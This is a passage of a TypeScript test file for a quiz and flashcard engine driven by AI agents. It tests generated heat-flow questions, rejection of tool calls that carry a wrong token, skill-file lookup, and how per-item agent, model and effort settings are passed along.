        kind: "choice",
        topic: "Direction of heat",
        prompt: "A cold spoon sits in hot soup. Which way does heat flow?",
        options: JSON.stringify(["From the soup into the spoon", "From the spoon into the soup", "Both ways equally"]),
        answer: "0",
        feedback: { correct: "Warmer to cooler.", incorrect: "Never cooler to warmer on its own." },
        cites: [{ passage: "P1", quote: "Heat moves from a warmer body to a cooler one" }],
      })).text);
      answers.push((await agent.call("finish_quiz", { title: "Heat" })).text);
      return { ok: true };
    });
    const definition = createQuizDefinition({ api: false, makers: [createAgentQuizMaker({ work: work(connector) })] });
    const result = await runEngine(definition, context(quizSettings({ kinds: ["choice"] }), { type: "quiz" }).ctx);
    expect(answers[0]).toContain("Kept as q1");
    expect((result.output.payload as QuizPayload).questions[0]!.options).toHaveLength(3);

    const bits = new FakeConnector(async (agent) => {
      answers.push((await agent.call("write_card", { kind: "recall", section: "Heat", front: JSON.stringify([{ type: "text", text: "Which way does heat flow?" }]), back: JSON.stringify([{ type: "text", text: "From warm to cool." }]), cites: JSON.stringify([{ passage: "P1" }]) })).text);
      await agent.call("finish_cards", { title: "Heat" });
      return { ok: true };
    });
    await runEngine(setDefinition(bits), context(cardSettings()).ctx);
    expect(answers[2]).toContain("Kept as c1");
  });

  it("a call with a wrong token, or for a turn that is not running, is refused", async () => {
    const call = (id: string, token: string) =>
      handleRequest(new Request(`${FAKE_ENGINE_URL}/v1/work-turns/${id}/tools`, { method: "POST", headers: { authorization: `Bearer ${token}`, "content-type": "application/json" }, body: JSON.stringify({ name: "outline_sources", arguments: {} }) }), undefined);
    expect((await call("no-such-turn", "anything")).status).toBe(404);
    let status = 0;
    const connector = new FakeConnector(async (agent) => {
      status = (await call(agent.body.turnId, "not-the-token")).status;
      await agent.call("write_card", goodCard(1));
      await agent.call("finish_cards", { title: "Heat" });
      return { ok: true };
    });
    await runEngine(setDefinition(connector), context(cardSettings()).ctx);
    expect(status).toBe(404);
  });
});

describe("skills the agent reads", () => {
  it("are found by their front matter and read by name or by file", () => {
    expect(skills().map((skill) => skill.name)).toEqual(["guide", "listening", "notebook", "planner"]);
    expect(readSkillFile("notebook")).toContain("name: notebook");
    expect(readSkillFile("references/quizzes.md")).toContain("Wrong options that are tempting for a real reason");
    expect(readSkillFile("notebook/references/nothing.md")).toBeUndefined();
  });
});


describe("the item's own agent, model and effort", () => {
  const failing = () => new FakeConnector(async () => ({ ok: false, problem: "error", said: "stop here" }));
  const sent = (connector: FakeConnector) => {
    const body = connector.bodies[0] as unknown as Record<string, unknown>;
    return { agent: body.agent, model: body.model, effort: body.effort };
  };

  it("reach the connector for a set of flashcards and a quiz", async () => {
    const cards = failing();
    await runEngine(setDefinition(cards), context(cardSettings({ cards: 2, agent: "agent:codex:gpt-5", effort: "high" })).ctx).catch(() => undefined);
    expect(sent(cards)).toEqual({ agent: "codex", model: "gpt-5", effort: "high" });

    const quiz = failing();
    const definition = createQuizDefinition({ api: false, makers: [createAgentQuizMaker({ work: work(quiz) })] });
    await runEngine(definition, context(quizSettings({ agent: "agent:antigravity", effort: "low" }), { type: "quiz" }).ctx).catch(() => undefined);
    expect(sent(quiz)).toEqual({ agent: "antigravity", model: undefined, effort: "low" });
  });

  it("leave the engine's own agent when the item says auto", async () => {
    const cards = failing();
    await runEngine(setDefinition(cards), context(cardSettings({ cards: 2, agent: "auto", effort: "auto" })).ctx).catch(() => undefined);
    expect(sent(cards)).toEqual({ agent: "claude", model: undefined, effort: undefined });
  });

  it("are one agent field per shape, settled from the shape's remembered pick", () => {
    const definitions = [setDefinition(failing()), createQuizDefinition({ api: false, makers: [createAgentQuizMaker({ work: work(failing()) })] })] as unknown as FormatDefinition[];
    for (const definition of definitions) {
      const fields = definition.descriptor.settings.filter((field) => field.kind === "agent");
      expect(fields).toMatchObject([{ key: "agent", role: "make", turnKind: "chat", effortKey: "effort" }]);
      const scope = definition.descriptor.id;
      const parsed = definition.parseSettings({});
      if (!parsed.ok) throw new Error("bad settings");
      expect(definition.settle!(parsed.settings, { sourceChars: 0, sourceCount: 0, picks: { [scope]: { agent: "codex", model: "gpt-5", effort: "high" } } })).toMatchObject({ agent: "agent:codex:gpt-5", effort: "high" });
    }
  });

  it("show only while a maker that runs the agent is picked, when Open Sourcebook's own writer is there too", () => {
    const definition = createFlashcardsDefinition({ makers: [createAgentFlashcardsMaker({ work: work(failing()), verify: passing })] });
    const field = definition.descriptor.settings.find((entry) => entry.key === "agent");
    expect(field?.showWhen?.key).toBe("maker");
    expect(field?.showWhen?.in).toContain("agent");
    expect(field?.showWhen?.in).not.toContain("api");
    const api = definition.parseSettings({ maker: "api" });
    if (!api.ok) throw new Error("bad settings");
    expect(definition.settle!(api.settings, { sourceChars: 0, sourceCount: 0, picks: { flashcards: { agent: "codex" } } })).not.toHaveProperty("agent");
  });
});
